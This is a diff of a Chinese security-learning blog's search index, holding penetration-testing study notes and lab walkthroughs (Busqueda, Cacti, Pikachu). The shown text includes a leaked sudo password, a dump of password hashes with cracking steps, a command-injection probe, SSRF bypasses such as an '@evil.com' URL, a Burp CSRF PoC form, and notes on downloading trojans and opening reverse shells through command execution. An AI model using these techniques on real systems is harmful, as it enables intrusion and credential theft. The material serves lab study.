@@ -82,7 +82,7 @@
 
 <p>根据域名来提供不同的网页内容</p>
 <p>所以使用域名访问时，仍然解析成ip地址，且建立http连接，只不过host中携带了域名，所以web服务器根据这个Host字段，选择相应的主机配置，呈现不同内容！</p>
-<p>ip地址与域名的关系，ip地址这种数字相对来说更容易记忆</p>
+<p>ip地址与域名的关系：域名比起ip(特别是有多个ip)这种数字相对来说更容易记忆。</p>
 <h2 id="bp二层代理原理"><a href="#bp二层代理原理" class="headerlink" title="bp二层代理原理"></a>bp二层代理原理</h2><p><strong>首先，我仅限理论上的讨论，没有做出违法的事情！！！一切以知识学习为主！！</strong></p>
 <p>​     </p>
 <p>上游代理，为了隐藏真实公网ip。</p>
@@ -106,7 +106,7 @@
 <p>好，在回答二层代理技术之前，先看一个流量路径：</p>
 <p><strong>浏览器-&gt;科学软件-&gt;?-&gt;服务器</strong></p>
 <p>怎么操作的？</p>
-<p>答：将本机的代理设置为一个127.0.0.1:1234端口；这个科学软件和bp一样，<strong>监听</strong>了本机的1234端口；所以由浏览器发出的流量，<strong>被路由</strong>到了科学软件上，科学软件接收到流量后，**(选择节点)** 将其路由到<strong>远程服务器</strong>，流量最终离开本机网络，通过远程服务器到达目标机</p>
+<p>答：将本机的代理设置为一个127.0.0.1:1234端口；这个科学软件和bp一样，<strong>监听</strong>了本机的1234端口；所以由浏览器发出的流量，<strong>被路由</strong>到了科学软件上，科学软件接收到流量后，(<strong>选择节点</strong>)， 将其路由到<strong>远程服务器</strong>，流量最终离开本机网络，通过远程服务器到达目标机</p>
 <p>这个过程，流量不是从浏览器直接发到目标机，目标机只会看到流量来自 <strong>科学软件或远程服务器的IP地址</strong>。</p>
 <p>如果科学软件里，你选择了个无效<strong>节点</strong>，那最终就没达到隐藏效果。</p>
 <p>经过上面两个流量路径，我们总结一个共同点：</p>
@@ -116,7 +116,7 @@
 <p>然后分析一下：</p>
 <p>第一个路径，用来拦截；第二个路径用来隐藏。</p>
 <p>二者侧重点不同。</p>
-<p>那么作为一个贪心的人，能不能有一个 <strong>即要又要</strong> 的方法呢？</p>
+<p>那么作为一个贪心的人，能不能有一个 <strong>既要又要</strong> 的方法呢？</p>
 <p>所以最后讨论bp的二层代理原理：</p>
 <p>流量路径为：<strong>浏览器-&gt;bp-&gt;(科学软件)-&gt;远程服务器-&gt;目标服务器</strong></p>
 <p>这就清晰了。</p>
@@ -124,6 +124,24 @@
 <p><strong>bp-&gt;(科学软件)<strong>，bp再设置一个上游代理，这个代理将bp发出的请求转发到另一个端口上，然后有另一个软件</strong>监听</strong>到该端口流量，并接收</p>
 <p>(科学软件)-&gt;节点，选择节点，嗯，懂？</p>
 <p>节点-&gt;目标服务器，skr！</p>
+<h2 id="内网访问内网"><a href="#内网访问内网" class="headerlink" title="内网访问内网?!"></a>内网访问内网?!</h2><p>再做一次回顾吧。</p>
+<p>我们看下面的访问路径：</p>
+<blockquote>
+<p>我的个人PC -&gt; <a href="http://www.baidu.com/">www.baidu.com</a></p>
+<p><a href="http://www.baidu.com/">www.baidu.com</a> -&gt; 我的个人PC</p>
+</blockquote>
+<p>这个就相当于：<strong>我ping百度可以，baidu能ping我吗？</strong></p>
+<p>我和百度不在同一个内网，但是它上线了，我可以ping到它；</p>
+<p>但同时也暴露了我的公网ip，它能不能ping我？</p>
+<p>我要求远在他乡的同学告诉我它的公网ip，并且，关闭防火墙。</p>
+<p>防火墙，对于一个PC来讲，只<strong>管入站</strong>不管出站，怎么理解，<code>孙悟空给师父画了一个圈，外人进不来，但不妨碍师父主动出去</code>。</p>
+<p><strong>下载命令</strong></p>
+<p>linux：wget，curl，java，python等</p>
+<p>windows：powershell、certutil等</p>
+<p>根据内置的下载命令，如果有一个漏洞是命令执行漏洞，那就可以通过该漏洞在目标机下载木马、反弹shell</p>
+<p><strong>反弹shell的正向连接、反向连接</strong></p>
+<p>对一个PC A来讲，<strong>它去监听一个端口，B通过端口去访问A，A监听到了</strong>，这叫正向</p>
+<p>对一个PC A来讲，如果A有了防火墙，A监听一个端口，B通过这个端口访问A，B访问不了，A也监听不到了，因为A的入站规则屏蔽了B；</p>
 ]]></content>
       <categories>
         <category>渗透</category>
@@ -239,7 +257,7 @@
 <p>尝试下cody后的东西作为密码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#118;&#99;&#x40;&#49;&#48;&#46;&#49;&#48;&#x2e;&#x31;&#x31;&#x2e;&#50;&#x30;&#56;">&#115;&#118;&#99;&#x40;&#49;&#48;&#46;&#49;&#48;&#x2e;&#x31;&#x31;&#x2e;&#50;&#x30;&#56;</a>，ssh连接即可。</p>
+<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#118;&#99;&#64;&#49;&#48;&#x2e;&#49;&#48;&#46;&#49;&#x31;&#x2e;&#50;&#x30;&#x38;">&#115;&#118;&#99;&#64;&#49;&#48;&#x2e;&#49;&#48;&#46;&#49;&#x31;&#x2e;&#50;&#x30;&#x38;</a>，ssh连接即可。</p>
 <h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
 <p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -475,7 +493,7 @@
 <p>www-data@50bca5e748b0:&#x2F;var&#x2F;www&#x2F;html&#x2F;include$ <strong>mysql –host&#x3D;db –user&#x3D;root –password&#x3D;root cacti -e “select * from user_auth;”</strong></p>
 </blockquote>
 <blockquote>
-<p>&lt;–password&#x3D;root cacti -e “select * from user_auth;”<br>id      username        password        realm   full_name       email_address   must_change_password    password_change      show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphspolicy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history     locked  failed_attempts lastfail        reset_perms<br>1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#97;&#100;&#109;&#105;&#110;&#64;&#x6d;&#111;&#110;&#105;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#x62;">&#97;&#100;&#109;&#105;&#110;&#64;&#x6d;&#111;&#110;&#105;&#116;&#111;&#114;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#x62;</a>                on      on      on      on      on      2       1       1       1       1   on       -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on  31       1       1       1       1               -1      -1      -1              0       0       0<br>4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#109;&#97;&#114;&#99;&#117;&#115;&#64;&#x6d;&#x6f;&#110;&#x69;&#116;&#111;&#114;&#x73;&#x74;&#119;&#111;&#46;&#104;&#x74;&#x62;">&#109;&#97;&#114;&#99;&#117;&#115;&#64;&#x6d;&#x6f;&#110;&#x69;&#116;&#111;&#114;&#x73;&#x74;&#119;&#111;&#46;&#104;&#x74;&#x62;</a>                       on      on      on      on      1       1       1       1       1   on       -1      -1              on      0       0       2135691668</p>
+<p>&lt;–password&#x3D;root cacti -e “select * from user_auth;”<br>id      username        password        realm   full_name       email_address   must_change_password    password_change      show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphspolicy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history     locked  failed_attempts lastfail        reset_perms<br>1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC    0       Jamie Thompson  <a href="mailto:&#97;&#100;&#109;&#x69;&#x6e;&#64;&#109;&#x6f;&#110;&#105;&#116;&#x6f;&#114;&#115;&#x74;&#x77;&#111;&#x2e;&#x68;&#x74;&#x62;">&#97;&#100;&#109;&#x69;&#x6e;&#64;&#109;&#x6f;&#110;&#105;&#116;&#x6f;&#114;&#115;&#x74;&#x77;&#111;&#x2e;&#x68;&#x74;&#x62;</a>                on      on      on      on      on      2       1       1       1       1   on       -1      -1      -1              0       0       663348655<br>3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on  31       1       1       1       1               -1      -1      -1              0       0       0<br>4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW&#x2F;MhFYK4C    0       Marcus Brune    <a href="mailto:&#x6d;&#x61;&#114;&#99;&#117;&#x73;&#x40;&#109;&#x6f;&#x6e;&#105;&#116;&#111;&#x72;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#98;">&#x6d;&#x61;&#114;&#99;&#117;&#x73;&#x40;&#109;&#x6f;&#x6e;&#105;&#116;&#111;&#x72;&#115;&#116;&#x77;&#111;&#x2e;&#104;&#x74;&#98;</a>                       on      on      on      on      1       1       1       1       1   on       -1      -1              on      0       0       2135691668</p>
 </blockquote>
 <p>密码都是哈希过的</p>
 <p>用hashcat反解$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ&#x2F;iuqMft&#x2F;llx8utpR1hjC的明文</p>
@@ -756,9 +774,8 @@
 <p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20231004232156093.png"></p>
 <p><code>host=127.0.0.1&amp;username=;kerbos</code></p>
 <p>响应包内容为：</p>
-<blockquote>
-<p>…]&#x2F;bin&#x2F;bash: line 1: <a href="mailto:&#107;&#101;&#x72;&#98;&#111;&#115;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;">&#107;&#101;&#x72;&#98;&#111;&#115;&#64;&#x31;&#50;&#x37;&#x2e;&#48;&#x2e;&#x30;&#46;&#49;</a>: command not found</p>
-</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">...]/bin/bash: line 1: kerbos@127.0.0.1: command not found</span><br></pre></td></tr></table></figure>
+
 <p>要是这样搞的话，</p>
 <p>我攻击机做一次服务器，让目标机访问攻击机呗</p>
 <p>kali写一个文件，中间要有@，那就叫 1@1吧</p>
@@ -1174,9 +1191,25 @@
         <category>靶场</category>
       </categories>
       <tags>
-        <tag>靶场</tag>
         <tag>渗透测试</tag>
+        <tag>靶场</tag>
         <tag>kali</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>开发语言</title>
+    <url>/2023/10/08/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/</url>
+    <content><![CDATA[<h1 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h1><p><strong>DLL文件反编译指向</strong></p>
+<p>一般代码在dll文件中，它的内容只有<code>inherits=被调用的类</code>拖到专门的分析工具中进行分析</p>
+<p><strong>web.config调试错误</strong></p>
+<p>有一个customError，mode属性为off时，当url尝试sql注入时，会有报错原因。</p>
+<p>on就是可以自定义报错信息</p>
+]]></content>
+      <categories>
+        <category>VPN</category>
+      </categories>
+      <tags>
+        <tag>VPN</tag>
       </tags>
   </entry>
   <entry>
@@ -5399,7 +5432,7 @@
 
 <p>假如访问…&#x2F;pic&#x2F;ps&#x2F;1.jpg，优先匹配第二个，是<strong>root</strong>，则…<code>/picture</code>&#x2F;pic&#x2F;ps&#x2F;1.jpg，即<strong>在前面加上</strong></p>
 <p>假如访问…&#x2F;pic&#x2F;1.jpg，匹配第一个，是<strong>alias</strong>，则…<code>/picture/pic</code>&#x2F;1.jpg，即<strong>直接替换</strong></p>
-<h1 id="yunpan项目"><a href="#yunpan项目" class="headerlink" title="yunpan项目"></a>yunpan项目</h1><h2 id="1-为什么我配置的邮箱是-x31-50-x33-x40-x71-113-x2e-x63-x6f-x6d-，但是前端设置任何邮箱都可以发送验证码"><a href="#1-为什么我配置的邮箱是-x31-50-x33-x40-x71-113-x2e-x63-x6f-x6d-，但是前端设置任何邮箱都可以发送验证码" class="headerlink" title="1.为什么我配置的邮箱是&#x31;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;，但是前端设置任何邮箱都可以发送验证码"></a>1.为什么我配置的邮箱是<a href="mailto:&#x31;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#50;&#x33;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>，但是前端设置任何邮箱都可以发送验证码</h2><p>且，即使是正确的邮箱，也没有收到信息</p>
+<h1 id="yunpan项目"><a href="#yunpan项目" class="headerlink" title="yunpan项目"></a>yunpan项目</h1><h2 id="1-为什么我配置的邮箱是-49-50-x33-64-113-x71-x2e-99-x6f-x6d-，但是前端设置任何邮箱都可以发送验证码"><a href="#1-为什么我配置的邮箱是-49-50-x33-64-113-x71-x2e-99-x6f-x6d-，但是前端设置任何邮箱都可以发送验证码" class="headerlink" title="1.为什么我配置的邮箱是&#49;&#50;&#x33;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;，但是前端设置任何邮箱都可以发送验证码"></a>1.为什么我配置的邮箱是<a href="mailto:&#49;&#50;&#x33;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;">&#49;&#50;&#x33;&#64;&#113;&#x71;&#x2e;&#99;&#x6f;&#x6d;</a>，但是前端设置任何邮箱都可以发送验证码</h2><p>且，即使是正确的邮箱，也没有收到信息</p>
 <h3 id="Answer"><a href="#Answer" class="headerlink" title="Answer:"></a>Answer:</h3><p>考虑前端验证和后端验证</p>
 <p>此处采用的后端验证，实现两个方法：</p>
 <p>1.在服务类接口实现中，判断前端输入的验证码是否正确</p>
@@ -5937,7 +5970,7 @@
 <p>之后改改主机上的.ssh&#x2F;config，配置如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName ssh.github.com</span><br><span class="line">    Port 443</span><br><span class="line">    User git</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa</span><br><span class="line">#centos	</span><br><span class="line">Host 192.168.1.89</span><br><span class="line">    Hostname 192.168.1.89</span><br><span class="line">    User root</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_centos</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h1 id="三、git-T-103-105-116-x40-103-105-x74-x68-x75-x62-46-99-111-x6d-出错"><a href="#三、git-T-103-105-116-x40-103-105-x74-x68-x75-x62-46-99-111-x6d-出错" class="headerlink" title="三、git -T &#103;&#105;&#116;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#x6d;出错"></a>三、git -T <a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#x6d;">&#103;&#105;&#116;&#x40;&#103;&#105;&#x74;&#x68;&#x75;&#x62;&#46;&#99;&#111;&#x6d;</a>出错</h1><p><code>kex_exchange_identification: Connection closed by remote host</code></p>
+<h1 id="三、git-T-x67-105-116-64-103-105-116-x68-117-x62-46-99-x6f-109-出错"><a href="#三、git-T-x67-105-116-64-103-105-116-x68-117-x62-46-99-x6f-109-出错" class="headerlink" title="三、git -T &#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#99;&#x6f;&#109;出错"></a>三、git -T <a href="mailto:&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#99;&#x6f;&#109;">&#x67;&#105;&#116;&#64;&#103;&#105;&#116;&#x68;&#117;&#x62;&#46;&#99;&#x6f;&#109;</a>出错</h1><p><code>kex_exchange_identification: Connection closed by remote host</code></p>
 <p>我的是因为上面config里，手写成了<code>HostName github.com</code>，少一个 <code>ssh.</code> 啊</p>
 ]]></content>
       <categories>
@@ -10433,7 +10466,7 @@
 <p>发现页面底部有</p>
 <p>Copyright © 2022 Project Develop by ….可以点击</p>
 <p>在页面随便点点，可以找到作者的邮箱</p>
-<p><a href="mailto:&#x6d;&#97;&#x79;&#x75;&#x72;&#105;&#x2e;&#105;&#x6e;&#102;&#x6f;&#x73;&#x70;&#97;&#99;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;">&#x6d;&#97;&#x79;&#x75;&#x72;&#105;&#x2e;&#105;&#x6e;&#102;&#x6f;&#x73;&#x70;&#97;&#99;&#x65;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#109;</a></p>
+<p><a href="mailto:&#x6d;&#97;&#121;&#x75;&#114;&#x69;&#x2e;&#105;&#x6e;&#102;&#x6f;&#x73;&#x70;&#x61;&#x63;&#101;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;">&#x6d;&#97;&#121;&#x75;&#114;&#x69;&#x2e;&#105;&#x6e;&#102;&#x6f;&#x73;&#x70;&#x61;&#x63;&#101;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#x6f;&#109;</a></p>
 <p>bp构造login&#x3D;0,login&#x3D;1也绕不过去哇</p>
 <p>密码那个跳转连接的名字，可以通过</p>
 <p>进去后的界面，是个药房管理系统，有各种报告。</p>
@@ -11330,7 +11363,7 @@
 <p>meterpreter &gt; .&#x2F;enumy64<br>[-] Unknown command: .&#x2F;enumy64<br>meterpreter &gt; <strong>shell</strong><br>Process 1147 created.<br>Channel 0 created.<br><strong>pwd</strong><br>&#x2F;var&#x2F;www&#x2F;html&#x2F;.nano<br><strong>.&#x2F;enumy64</strong></p>
 </blockquote>
 <blockquote>
-<p>Current User Info    uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>Version              Linux version 4.19.0-10-amd64 (<a href="mailto:&#100;&#x65;&#x62;&#105;&#x61;&#x6e;&#45;&#107;&#101;&#x72;&#x6e;&#x65;&#108;&#64;&#108;&#x69;&#x73;&#116;&#x73;&#x2e;&#100;&#101;&#98;&#x69;&#x61;&#x6e;&#x2e;&#x6f;&#x72;&#x67;">&#100;&#x65;&#x62;&#105;&#x61;&#x6e;&#45;&#107;&#101;&#x72;&#x6e;&#x65;&#108;&#64;&#108;&#x69;&#x73;&#116;&#x73;&#x2e;&#100;&#101;&#98;&#x69;&#x61;&#x6e;&#x2e;&#x6f;&#x72;&#x67;</a>) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)<br>hostname             chili<br>Umask                u&#x3D;rwx,g&#x3D;rx,o&#x3D;rx</p>
+<p>Current User Info    uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>Version              Linux version 4.19.0-10-amd64 (<a href="mailto:&#x64;&#101;&#98;&#105;&#x61;&#110;&#45;&#107;&#x65;&#114;&#110;&#101;&#108;&#x40;&#x6c;&#x69;&#x73;&#116;&#x73;&#46;&#100;&#101;&#98;&#x69;&#97;&#110;&#x2e;&#111;&#x72;&#103;">&#x64;&#101;&#98;&#105;&#x61;&#110;&#45;&#107;&#x65;&#114;&#110;&#101;&#108;&#x40;&#x6c;&#x69;&#x73;&#116;&#x73;&#46;&#100;&#101;&#98;&#x69;&#97;&#110;&#x2e;&#111;&#x72;&#103;</a>) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)<br>hostname             chili<br>Umask                u&#x3D;rwx,g&#x3D;rx,o&#x3D;rx</p>
 <h2 id="Last-Login"><a href="#Last-Login" class="headerlink" title="Last Login"></a>Last Login</h2><p>Username         Port     From             Latest<br>root             tty1                      Tue Sep  8 13:11:53 -0400 2020<br>chili            tty1                      Tue Sep  8 13:12:50 -0400 2020</p>
 <h2 id="User-Accounts"><a href="#User-Accounts" class="headerlink" title="User Accounts"></a>User Accounts</h2><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync<br>chili:x:1000:1000:chili,,,:&#x2F;home&#x2F;chili:&#x2F;bin&#x2F;bash</p>
 <h2 id="Who-Else-Is-Logged-On"><a href="#Who-Else-Is-Logged-On" class="headerlink" title="Who Else Is Logged On"></a>Who Else Is Logged On</h2><p> 10:22:42 up  1:42,  0 users,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</p>
@@ -12680,7 +12713,7 @@
 <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求<br>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a><br>2.dnslog等工具进行测试，看是否被访问<br>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。<br>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址<br>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>–通过二级域名暴力猜解工具模糊猜测内网地址<br>4.直接返回的Banner、title、content等信息<br>5.留意bool型SSRF<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="1-绕过IP"><a href="#1-绕过IP" class="headerlink" title="1.绕过IP"></a>1.绕过IP</h3><p>1）使用IPV6地址<br>2）对IP转化成十进制，八进制等，如0177.0.0.01（八进制）<br>3）利用特殊域名。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1<br>4）利用句号。如127。0。0。1<br>5）可以[::]。如http:&#x2F;&#x2F;[::]:80&#x2F;<br>6）利用短网址。比如百度短地址<br>————————————————<br>版权声明：本文为CSDN博主「Never say die _」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_45612828/article/details/126193765">https://blog.csdn.net/qq_45612828/article/details/126193765</a></p>
 <h3 id="2-绕过url解析限制"><a href="#2-绕过url解析限制" class="headerlink" title="2.绕过url解析限制"></a>2.绕过url解析限制</h3><ul>
-<li>1）使用@符号绕过：如<a href="mailto:&#49;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#64;&#x65;&#118;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;">&#49;&#x32;&#x37;&#46;&#x30;&#x2e;&#x30;&#x2e;&#x31;&#64;&#x65;&#118;&#x69;&#x6c;&#46;&#x63;&#111;&#x6d;</a></li>
+<li>1）使用@符号绕过：如<a href="mailto:&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;&#x40;&#101;&#118;&#105;&#108;&#46;&#99;&#111;&#109;">&#x31;&#x32;&#55;&#46;&#x30;&#x2e;&#x30;&#46;&#49;&#x40;&#101;&#118;&#105;&#108;&#46;&#99;&#111;&#109;</a></li>
 <li>2）利用302跳转，需要一个vps，把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</li>
 </ul>
 <h3 id="3-DNS重绑定攻击"><a href="#3-DNS重绑定攻击" class="headerlink" title="3.DNS重绑定攻击"></a>3.DNS重绑定攻击</h3><p><a href="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/">Geekby’s Blog</a></p>
@@ -14638,7 +14671,7 @@
 <p>性别:boy</p>
 <p>手机:15988767673</p>
 <p>住址:nba lakes</p>
-<p>邮箱:<a href="mailto:&#107;&#x6f;&#x62;&#101;&#64;&#x70;&#105;&#107;&#97;&#x63;&#x68;&#117;&#x2e;&#99;&#111;&#x6d;">&#107;&#x6f;&#x62;&#101;&#64;&#x70;&#105;&#107;&#97;&#x63;&#x68;&#117;&#x2e;&#99;&#111;&#x6d;</a></p>
+<p>邮箱:<a href="mailto:&#107;&#111;&#x62;&#101;&#64;&#112;&#x69;&#x6b;&#97;&#x63;&#104;&#x75;&#x2e;&#99;&#x6f;&#109;">&#107;&#111;&#x62;&#101;&#64;&#112;&#x69;&#x6b;&#97;&#x63;&#104;&#x75;&#x2e;&#99;&#x6f;&#109;</a></p>
 </blockquote>
 <p>通过bp抓包，右键工具菜单，生成csrf poc，复制写好的表单html文件，放到同文件夹下(csrfpost\)，记为test.html。</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:81/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;girl&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;15988767673&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;nba<span class="symbol">&amp;#32;</span>lakes&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;kobe<span class="symbol">&amp;#64;</span>pikachu<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -14962,164 +14995,8 @@
         <category>渗透测试</category>
       </categories>
       <tags>
-        <tag>渗透测试</tag>
         <tag>python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sql注入-tips</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5-tips/</url>
